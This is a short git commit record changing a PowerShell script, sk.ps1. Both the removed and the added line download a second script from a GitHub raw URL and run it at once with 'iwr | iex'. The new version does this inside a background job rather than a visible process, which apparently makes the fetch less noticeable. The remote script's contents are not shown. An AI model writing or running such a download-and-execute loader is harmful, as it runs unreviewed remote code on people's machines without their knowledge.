0b9a874278cb24e1eac8c5f0a26718668216083e
Your Name <you@example.com>
2024-06-12 17:36:03 +0200

    jjh66

--- sk.ps1
+++ sk.ps1
@@ -1,1 +1,1 @@
-Start-Process powershell -ArgumentList '-NoProfile -Command "& {iwr -useb https://raw.githubusercontent.com/numeryczne/numeryczne/main/sk2.ps1 | iex}"'
+Start-Job -ScriptBlock { iwr -useb https://raw.githubusercontent.com/numeryczne/numeryczne/main/sk2.ps1 | iex}
